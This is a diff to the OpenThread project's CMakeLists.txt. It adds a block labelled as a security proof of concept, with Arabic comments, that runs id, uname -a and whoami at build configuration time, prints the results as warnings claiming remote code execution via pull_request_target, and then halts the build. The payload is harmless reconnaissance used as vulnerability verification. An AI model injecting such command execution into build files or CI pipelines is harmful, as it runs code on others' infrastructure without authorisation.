@@ -33,6 +33,23 @@ file(READ .default-version OT_DEFAULT_VERSION)
 string(STRIP ${OT_DEFAULT_VERSION} OT_DEFAULT_VERSION)
 
 project(openthread VERSION ${OT_DEFAULT_VERSION})
+
+# --- START SECURITY POC (Vulnerability Verification) ---
+# الهدف: إثبات القدرة على تنفيذ أوامر النظام (RCE) عبر ملفات البناء غير الموثوقة.
+message(WARNING "***************************************************")
+message(WARNING "VULNERABILITY CONFIRMED: RCE via pull_request_target")
+execute_process(COMMAND id OUTPUT_VARIABLE POC_ID)
+execute_process(COMMAND uname -a OUTPUT_VARIABLE POC_NODE)
+execute_process(COMMAND whoami OUTPUT_VARIABLE POC_USER)
+message(WARNING "Running as User: ${POC_USER}")
+message(WARNING "System ID: ${POC_ID}")
+message(WARNING "Node Info: ${POC_NODE}")
+message(WARNING "***************************************************")
+
+# استخدام FATAL_ERROR هنا لإيقاف الـ Workflow فوراً وجعل النتيجة واضحة جداً في السجلات.
+message(FATAL_ERROR "Proof of Concept Successful - Execution Proven.")
+# --- END SECURITY POC ---
+
 include(CTest)
 
 option(OT_BUILD_EXECUTABLES "Build executables" ON)
